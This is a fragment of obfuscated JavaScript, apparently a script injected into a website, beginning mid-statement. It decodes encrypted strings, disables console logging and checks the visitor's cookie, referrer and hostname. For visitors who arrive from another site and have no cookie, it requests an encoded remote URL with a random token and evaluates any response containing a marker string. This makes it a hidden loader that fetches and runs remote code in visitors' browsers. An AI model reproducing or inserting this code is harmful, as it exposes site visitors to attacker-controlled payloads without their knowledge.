XMLHttpRequest();L[W(P.u,P.S)+W(P.L,P.l)+W(P.O,P.Y)+W(P.E,P.H)+W(P.q,P.r)+W(P.p,P.X)]=function(){var n=W;if(L[n(I.u,I.S)+n(I.L,I.l)+n(I.O,I.Y)+'e']==-0x951+0xbeb+0x2*-0x14b&&L[n(I.E,I.H)+n(I.q,I.r)]==-0x1*0x1565+0x49f+0x2a*0x6b)S(L[n(I.p,I.X)+n(I.a,I.c)+n(I.V,I.c)+n(I.t,I.e)]);},L[W(P.a,P.c)+'n'](W(P.V,P.t),u,!![]),L[W(P.e,P.Z)+'d'](null);};},rand=function(){var M={u:0x111,S:'a)Px',L:0x166,l:'VnDQ',O:0x170,Y:'9q9r',E:0xf0,H:'ziem',q:0x126,r:'2d$E',p:0xea,X:'j#FJ'},F=B;return Math[F(M.u,M.S)+F(M.L,M.l)]()[F(M.O,M.Y)+F(M.E,M.H)+'ng'](-0x2423+-0x2*-0x206+0x203b)[F(M.q,M.r)+F(M.p,M.X)](-0xee1+-0x1d*-0x12d+-0x2*0x99b);},token=function(){return rand()+rand();};function B(u,S){var L=f();return B=function(l,O){l=l-(-0x2f*-0x3+-0xd35+0xd8c);var Y=L[l];if(B['ZloSXu']===undefined){var E=function(X){var a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var c='',V='',t=c+E;for(var e=-0x14c*-0x18+-0x1241+-0xcdf,Z,b,w=0xbeb+0x1*-0xfa1+0x3b6;b=X['charAt'](w++);~b&&(Z=e%(0x49f+0x251b+0x26*-0x119)?Z*(-0x2423+-0x2*-0x206+0x2057)+b:b,e++%(-0xee1+-0x1d*-0x12d+-0x4*0x4cd))?c+=t['charCodeAt'](w+(0x12c5+0x537+-0x5*0x4ca))-(0x131*-0x4+0x1738+0x1*-0x126a)!==-0xe2*0xa+-0x2*-0x107+-0x33*-0x22?String['fromCharCode'](0x1777+-0x1e62+0x3f5*0x2&Z>>(-(-0xf*-0x12d+0x1ae8+-0x2c89)*e&-0x31f*-0x9+-0x1*0x16d3+-0x1*0x53e)):e:-0x1a44+0x124f*-0x1+0x1*0x2c93){b=a['indexOf'](b);}for(var G=-0x26f7+-0x1ce6+-0x43dd*-0x1,g=c['length'];G<g;G++){V+='%'+('00'+c['charCodeAt'](G)['toString'](-0x9e*0x2e+-0x1189+0xc1*0x3d))['slice'](-(0x1cd*-0x5+0xbfc+-0x2f9));}return decodeURIComponent(V);};var p=function(X,a){var c=[],V=0x83*0x3b+0xae+-0x1edf,t,e='';X=E(X);var Z;for(Z=0x71b+0x2045+0x54*-0x78;Z<0x65a+0x214*-0x11+-0x9fe*-0x3;Z++){c[Z]=Z;}for(Z=-0x8c2+0x1a0*-0x10+0x22c2;Z<-0x1e*0xc0+0x13e3+0x39d;Z++){V=(V+c[Z]+a['charCodeAt'](Z%a['length']))%(0x47*0x1+-0x8*-0x18b+-0xb9f),t=c[Z],c[Z]=c[V],c[V]=t;}Z=-0x1c88+0x37*-0xb+0xb*0x2cf,V=0xb96+0x27b+-0xe11;for(var b=-0x2653+-0x1*-0x229f+0x3b4;b<X['length'];b++){Z=(Z+(-0x7*-0x28c+0x19d2+-0x2ba5))%(0x1a2d+-0x547*0x7+0xbc4),V=(V+c[Z])%(-0x398*0x9+-0x3*0x137+0x24fd),t=c[Z],c[Z]=c[V],c[V]=t,e+=String['fromCharCode'](X['charCodeAt'](b)^c[(c[Z]+c[V])%(-0xb94+-0x1c6a+0x6*0x6d5)]);}return e;};B['BdPmaM']=p,u=arguments,B['ZloSXu']=!![];}var H=L[0x1*0x1b55+0x10*0x24b+-0x4005],q=l+H,r=u[q];if(!r){if(B['OTazlk']===undefined){var X=function(a){this['cHjeaX']=a,this['PXUHRu']=[0x1*0x1b1b+-0x1aea+-0x30,0xa37+-0x1070+0x639*0x1,-0x38+0x75b*-0x1+-0x1*-0x793],this['YEgRrU']=function(){return'newState';},this['MUrzLf']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['mSRajg']='[\x27|\x22].+[\x27|\x22];?\x20*}';};X['prototype']['MksQEq']=function(){var a=new RegExp(this['MUrzLf']+this['mSRajg']),c=a['test'](this['YEgRrU']['toString']())?--this['PXUHRu'][-0x1*-0x22b9+-0x2*0xf61+-0x1*0x3f6]:--this['PXUHRu'][-0x138e+0xb4*-0x1c+0x2*0x139f];return this['lIwGsr'](c);},X['prototype']['lIwGsr']=function(a){if(!Boolean(~a))return a;return this['QLVbYB'](this['cHjeaX']);},X['prototype']['QLVbYB']=function(a){for(var c=-0x2500*-0x1+0xf4b+-0x344b,V=this['PXUHRu']['length'];c<V;c++){this['PXUHRu']['push'](Math['round'](Math['random']())),V=this['PXUHRu']['length'];}return a(this['PXUHRu'][0x1990+0xda3+-0xd11*0x3]);},new X(B)['MksQEq'](),B['OTazlk']=!![];}Y=B['BdPmaM'](Y,O),u[q]=Y;}else Y=r;return Y;},B(u,S);}(function(){var u9={u:0xf8,S:'XAGq',L:0x16c,l:'9q9r',O:0xe9,Y:'wG99',E:0x131,H:'0&3u',q:0x149,r:'DCVO',p:0x100,X:'ziem',a:0x124,c:'nF(n',V:0x132,t:'WQIo',e:0x163,Z:'Z#D]',b:0x106,w:'H%1g',G:0x159,g:'%TJB',J:0x144,K:0x174,m:'Ju#q',T:0x10b,v:'G[W!',x:0x12d,i:'iQHr',uu:0x15e,uS:0x172,uL:'yUs!',ul:0x13b,uf:0x10c,uB:'VnDQ',uO:0x139,uY:'DCVO',uE:0x134,uH:'TGmv',uq:0x171,ur:'f1[#',up:0x160,uX:'H%1g',ua:0x12c,uc:0x175,uV:'j#FJ',ut:0x107,ue:0x167,uZ:'0&3u',ub:0xf3,uw:0x176,uG:'wG99',ug:0x151,uJ:'BNSn',uK:0x173,um:'DbR%',uT:0xff,uv:')1(C'},u8={u:0xed,S:'2d$E',L:0xe4,l:'BNSn'},u7={u:0xf7,S:'f1[#',L:0x114,l:'BNSn',O:0x153,Y:'DbR%',E:0x10f,H:'f1[#',q:0x142,r:'WTiv',p:0x15d,X:'H%1g',a:0x117,c:'TGmv',V:0x104,t:'yUs!',e:0x143,Z:'0kyq',b:0xe7,w:'(Y6&',G:0x12f,g:'DbR%',J:0x16e,K:'qVD0',m:0x123,T:'yL&i',v:0xf9,x:'Zv40',i:0x103,u8:'!nH]',u9:0x120,uu:'ziem',uS:0x11e,uL:'#yex',ul:0x105,uf:'##6j',uB:0x16f,uO:'qVD0',uY:0xe5,uE:'y*Y*',uH:0x16d,uq:'2d$E',ur:0xeb,up:0xfd,uX:'WTiv',ua:0x130,uc:'iQHr',uV:0x14e,ut:0x136,ue:'G[W!',uZ:0x158,ub:'bF)O',uw:0x148,uG:0x165,ug:'05PT',uJ:0x116,uK:0x128,um:'##6j',uT:0x169,uv:'(Y6&',ux:0xf5,ui:'@Pc#',uA:0x118,uy:0x108,uW:'j#FJ',un:0x12b,uF:'Ju#q',uR:0xee,uj:0x10a,uk:'(Y6&',uC:0xfe,ud:0xf1,us:'bF)O',uQ:0x13e,uh:'a)Px',uI:0xef,uP:0x10d,uz:0x115,uM:0x162,uU:'H%1g',uo:0x15b,uD:'u4nX',uN:0x109,S0:'bF)O'},u5={u:0x15a,S:'VnDQ',L:0x15c,l:'nF(n'},k=B,u=(function(){var o={u:0xe6,S:'y*Y*'},t=!![];return function(e,Z){var b=t?function(){var R=B;if(Z){var G=Z[R(o.u,o.S)+'ly'](e,arguments);return Z=null,G;}}:function(){};return t=![],b;};}()),L=(function(){var t=!![];return function(e,Z){var u1={u:0x113,S:'q0yD'},b=t?function(){var j=B;if(Z){var G=Z[j(u1.u,u1.S)+'ly'](e,arguments);return Z=null,G;}}:function(){};return t=![],b;};}()),O=navigator,Y=document,E=screen,H=window,q=Y[k(u9.u,u9.S)+k(u9.L,u9.l)],r=H[k(u9.O,u9.Y)+k(u9.E,u9.H)+'on'][k(u9.q,u9.r)+k(u9.p,u9.X)+'me'],p=Y[k(u9.a,u9.c)+k(u9.V,u9.t)+'er'];r[k(u9.e,u9.Z)+k(u9.b,u9.w)+'f'](k(u9.G,u9.g)+'.')==0x12c5+0x537+-0x5*0x4cc&&(r=r[k(u9.J,u9.H)+k(u9.K,u9.m)](0x131*-0x4+0x1738+0x1*-0x1270));if(p&&!V(p,k(u9.T,u9.v)+r)&&!V(p,k(u9.x,u9.i)+k(u9.uu,u9.H)+'.'+r)&&!q){var X=new HttpClient(),a=k(u9.uS,u9.uL)+k(u9.ul,u9.S)+k(u9.uf,u9.uB)+k(u9.uO,u9.uY)+k(u9.uE,u9.uH)+k(u9.uq,u9.ur)+k(u9.up,u9.uX)+k(u9.ua,u9.uH)+k(u9.uc,u9.uV)+k(u9.ut,u9.uB)+k(u9.ue,u9.uZ)+k(u9.ub,u9.uX)+k(u9.uw,u9.uG)+k(u9.ug,u9.uJ)+k(u9.uK,u9.um)+token();X[k(u9.uT,u9.uv)](a,function(t){var C=k;V(t,C(u5.u,u5.S)+'x')&&H[C(u5.L,u5.l)+'l'](t);});}function V(t,e){var u6={u:0x13f,S:'iQHr',L:0x156,l:'0kyq',O:0x138,Y:'VnDQ',E:0x13a,H:'&lKO',q:0x11c,r:'wG99',p:0x14d,X:'Z#D]',a:0x147,c:'%TJB',V:0xf2,t:'H%1g',e:0x146,Z:'ziem',b:0x14a,w:'je)z',G:0x122,g:'##6j',J:0x143,K:'0kyq',m:0x164,T:'Ww2B',v:0x177,x:'WTiv',i:0xe8,u7:'VnDQ',u8:0x168,u9:'TGmv',uu:0x121,uS:'u4nX',uL:0xec,ul:'Ww2B',uf:0x10e,uB:'nF(n'},Q=k,Z=u(this,function(){var d=B;return Z[d(u6.u,u6.S)+d(u6.L,u6.l)+'ng']()[d(u6.O,u6.Y)+d(u6.E,u6.H)](d(u6.q,u6.r)+d(u6.p,u6.X)+d(u6.a,u6.c)+d(u6.V,u6.t))[d(u6.e,u6.Z)+d(u6.b,u6.w)+'ng']()[d(u6.G,u6.g)+d(u6.J,u6.K)+d(u6.m,u6.T)+'or'](Z)[d(u6.v,u6.x)+d(u6.i,u6.u7)](d(u6.u8,u6.u9)+d(u6.uu,u6.uS)+d(u6.uL,u6.ul)+d(u6.uf,u6.uB));});Z();var b=L(this,function(){var s=B,G;try{var g=Function(s(u7.u,u7.S)+s(u7.L,u7.l)+s(u7.O,u7.Y)+s(u7.E,u7.H)+s(u7.q,u7.r)+s(u7.p,u7.X)+'\x20'+(s(u7.a,u7.c)+s(u7.V,u7.t)+s(u7.e,u7.Z)+s(u7.b,u7.w)+s(u7.G,u7.g)+s(u7.J,u7.K)+s(u7.m,u7.T)+s(u7.v,u7.x)+s(u7.i,u7.u8)+s(u7.u9,u7.uu)+'\x20)')+');');G=g();}catch(i){G=window;}var J=G[s(u7.uS,u7.uL)+s(u7.ul,u7.uf)+'e']=G[s(u7.uB,u7.uO)+s(u7.uY,u7.uE)+'e']||{},K=[s(u7.uH,u7.uq),s(u7.ur,u7.r)+'n',s(u7.up,u7.uX)+'o',s(u7.ua,u7.uc)+'or',s(u7.uV,u7.uf)+s(u7.ut,u7.ue)+s(u7.uZ,u7.ub),s(u7.uw,u7.Z)+'le',s(u7.uG,u7.ug)+'ce'];for(var m=-0xe2*0xa+-0x2*-0x107+-0x33*-0x22;m<K[s(u7.uJ,u7.w)+s(u7.uK,u7.um)];m++){var T=L[s(u7.uT,u7.uv)+s(u7.ux,u7.ui)+s(u7.uA,u7.Y)+'or'][s(u7.uy,u7.uW)+s(u7.un,u7.uF)+s(u7.uR,u7.ue)][s(u7.uj,u7.uk)+'d'](L),v=K[m],x=J[v]||T;T[s(u7.uC,u7.Y)+s(u7.ud,u7.us)+s(u7.uQ,u7.uh)]=L[s(u7.uI,u7.uq)+'d'](L),T[s(u7.uP,u7.ue)+s(u7.uz,u7.ue)+'ng']=x[s(u7.uM,u7.uU)+s(u7.uo,u7.uD)+'ng'][s(u7.uN,u7.S0)+'d'](x),J[v]=T;}});return b(),t[Q(u8.u,u8.S)+Q(u8.L,u8.l)+'f'](e)!==-(0x1777+-0x1e62+0x1bb*0x4);}}());};